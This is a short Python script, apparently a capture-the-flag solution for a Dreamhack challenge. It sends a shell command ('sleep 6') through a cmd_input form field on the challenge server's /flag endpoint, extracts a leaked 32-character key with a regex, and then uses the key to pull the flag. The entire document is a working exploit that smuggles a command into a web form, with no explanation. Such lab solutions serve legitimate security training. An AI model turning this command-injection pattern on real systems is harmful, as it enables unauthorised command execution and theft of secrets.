import re
import requests

host = 'http://host3.dreamhack.games:15563/'

def get_key():
    payload = {
        'key': '',
        'cmd_input': 'sleep 6'
    }
    req = requests.post(host + 'flag', data=payload)
    return re.search(r'[a-f0-9]{32}', req.text).group()

def get_flag(key):
    payload = {
        'key': key,
        'cmd_input': ''
    }
    req = requests.post(host + 'flag', data=payload)
    return re.search(r'DH{.*?}', req.text).group()

print(get_key())
print(get_flag(get_key()))